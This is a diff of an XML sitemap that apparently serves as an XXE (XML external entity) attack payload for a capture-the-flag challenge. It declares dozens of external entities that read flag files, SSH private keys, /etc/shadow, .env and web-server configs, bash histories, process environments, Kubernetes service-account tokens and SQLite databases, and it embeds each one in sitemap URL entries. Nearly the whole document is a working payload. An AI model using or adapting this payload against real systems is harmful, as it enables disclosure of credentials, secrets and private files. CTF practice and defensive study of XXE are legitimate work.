@@ -1,9 +1,115 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE urlset [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!-- Flags communs -->
+  <!ENTITY flag1 SYSTEM "file:///flag.txt">
+  <!ENTITY flag2 SYSTEM "file:///root/flag.txt">
+  <!ENTITY flag3 SYSTEM "file:///home/ctf/flag.txt">
+  <!ENTITY flag4 SYSTEM "file:///var/www/flag.txt">
+  <!ENTITY flag5 SYSTEM "file:///var/www/html/flag.txt">
+  <!ENTITY flag6 SYSTEM "file:///home/node/flag.txt">
+  
+  <!-- Clés SSH -->
+  <!ENTITY ssh1 SYSTEM "file:///root/.ssh/id_rsa">
+  <!ENTITY ssh2 SYSTEM "file:///home/node/.ssh/id_rsa">
+  <!ENTITY ssh3 SYSTEM "file:///home/daemon/.ssh/id_rsa">
+  <!ENTITY ssh4 SYSTEM "file:///root/.ssh/authorized_keys">
+  
+  <!-- Fichiers de configuration -->
+  <!ENTITY config1 SYSTEM "file:///var/www/html/.env">
+  <!ENTITY config2 SYSTEM "file:///var/www/html/config.php">
+  <!ENTITY config3 SYSTEM "file:///var/www/html/config.json">
+  <!ENTITY config4 SYSTEM "file:///var/www/html/settings.php">
+  <!ENTITY config5 SYSTEM "file:///etc/nginx/nginx.conf">
+  <!ENTITY config6 SYSTEM "file:///etc/apache2/apache2.conf">
+  
+  <!-- Historiques bash -->
+  <!ENTITY hist1 SYSTEM "file:///root/.bash_history">
+  <!ENTITY hist2 SYSTEM "file:///home/node/.bash_history">
+  
+  <!-- Fichiers sensibles système -->
+  <!ENTITY shadow SYSTEM "file:///etc/shadow">
+  <!ENTITY hosts SYSTEM "file:///etc/hosts">
+  <!ENTITY hostname SYSTEM "file:///etc/hostname">
+  
+  <!-- Code source de l'application -->
+  <!ENTITY app1 SYSTEM "file:///var/www/html/index.php">
+  <!ENTITY app2 SYSTEM "file:///var/www/html/verify.php">
+  <!ENTITY app3 SYSTEM "file:///var/www/html/index.html">
+  <!ENTITY app4 SYSTEM "file:///var/www/html/app.js">
+  <!ENTITY app5 SYSTEM "file:///var/www/html/server.js">
+  
+  <!-- Variables d'environnement et secrets -->
+  <!ENTITY env1 SYSTEM "file:///proc/self/environ">
+  <!ENTITY env2 SYSTEM "file:///proc/1/environ">
+  
+  <!-- Logs -->
+  <!ENTITY log1 SYSTEM "file:///var/log/nginx/access.log">
+  <!ENTITY log2 SYSTEM "file:///var/log/nginx/error.log">
+  <!ENTITY log3 SYSTEM "file:///var/log/apache2/access.log">
+  
+  <!-- Fichiers Docker (si conteneurisé) -->
+  <!ENTITY docker1 SYSTEM "file:///.dockerenv">
+  <!ENTITY docker2 SYSTEM "file:///run/secrets/kubernetes.io/serviceaccount/token">
+  
+  <!-- Databases SQLite possibles -->
+  <!ENTITY db1 SYSTEM "file:///var/www/html/database.sqlite">
+  <!ENTITY db2 SYSTEM "file:///var/www/html/db.sqlite3">
 ]>
-<urlset>
-  <url>
-    <loc>&xxe;</loc>
-  </url>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  
+  <!-- FLAGS -->
+  <url><loc>&flag1;</loc><priority>1.0</priority></url>
+  <url><loc>&flag2;</loc><priority>1.0</priority></url>
+  <url><loc>&flag3;</loc><priority>1.0</priority></url>
+  <url><loc>&flag4;</loc><priority>1.0</priority></url>
+  <url><loc>&flag5;</loc><priority>1.0</priority></url>
+  <url><loc>&flag6;</loc><priority>1.0</priority></url>
+  
+  <!-- SSH KEYS -->
+  <url><loc>&ssh1;</loc><priority>0.9</priority></url>
+  <url><loc>&ssh2;</loc><priority>0.9</priority></url>
+  <url><loc>&ssh3;</loc><priority>0.9</priority></url>
+  <url><loc>&ssh4;</loc><priority>0.9</priority></url>
+  
+  <!-- CONFIG FILES -->
+  <url><loc>&config1;</loc><priority>0.9</priority></url>
+  <url><loc>&config2;</loc><priority>0.9</priority></url>
+  <url><loc>&config3;</loc><priority>0.9</priority></url>
+  <url><loc>&config4;</loc><priority>0.9</priority></url>
+  <url><loc>&config5;</loc><priority>0.8</priority></url>
+  <url><loc>&config6;</loc><priority>0.8</priority></url>
+  
+  <!-- BASH HISTORY -->
+  <url><loc>&hist1;</loc><priority>0.8</priority></url>
+  <url><loc>&hist2;</loc><priority>0.8</priority></url>
+  
+  <!-- SYSTEM FILES -->
+  <url><loc>&shadow;</loc><priority>0.9</priority></url>
+  <url><loc>&hosts;</loc><priority>0.5</priority></url>
+  <url><loc>&hostname;</loc><priority>0.5</priority></url>
+  
+  <!-- APP SOURCE CODE -->
+  <url><loc>&app1;</loc><priority>0.8</priority></url>
+  <url><loc>&app2;</loc><priority>0.8</priority></url>
+  <url><loc>&app3;</loc><priority>0.7</priority></url>
+  <url><loc>&app4;</loc><priority>0.7</priority></url>
+  <url><loc>&app5;</loc><priority>0.7</priority></url>
+  
+  <!-- ENVIRONMENT -->
+  <url><loc>&env1;</loc><priority>0.8</priority></url>
+  <url><loc>&env2;</loc><priority>0.8</priority></url>
+  
+  <!-- LOGS -->
+  <url><loc>&log1;</loc><priority>0.6</priority></url>
+  <url><loc>&log2;</loc><priority>0.6</priority></url>
+  <url><loc>&log3;</loc><priority>0.6</priority></url>
+  
+  <!-- DOCKER -->
+  <url><loc>&docker1;</loc><priority>0.7</priority></url>
+  <url><loc>&docker2;</loc><priority>0.7</priority></url>
+  
+  <!-- DATABASES -->
+  <url><loc>&db1;</loc><priority>0.7</priority></url>
+  <url><loc>&db2;</loc><priority>0.7</priority></url>
+  
 </urlset>
